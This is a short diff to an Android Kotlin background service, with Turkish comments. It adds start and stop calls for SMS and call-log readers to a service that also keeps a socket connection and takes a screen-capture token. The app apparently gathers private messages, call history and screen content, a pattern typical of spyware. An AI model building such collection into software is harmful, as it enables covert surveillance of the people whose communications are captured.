@@ -30,6 +30,10 @@ class MainService : Service() {
             Log.d("MainService", "Socket zaten bağlı")
         }
 
+        // SMS ve arama geçmişi okuyucuları — başlatılmamışsa başlat
+        SmsReader.start(this)
+        CallLogReader.start(this)
+
         // MediaProjection token'ı MainActivity'den al
         val resultCode = intent?.getIntExtra("resultCode", -1) ?: -1
         val projData   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
@@ -90,5 +94,7 @@ class MainService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         SocketManager.disconnect()
+        SmsReader.stop()
+        CallLogReader.stop()
     }
 }
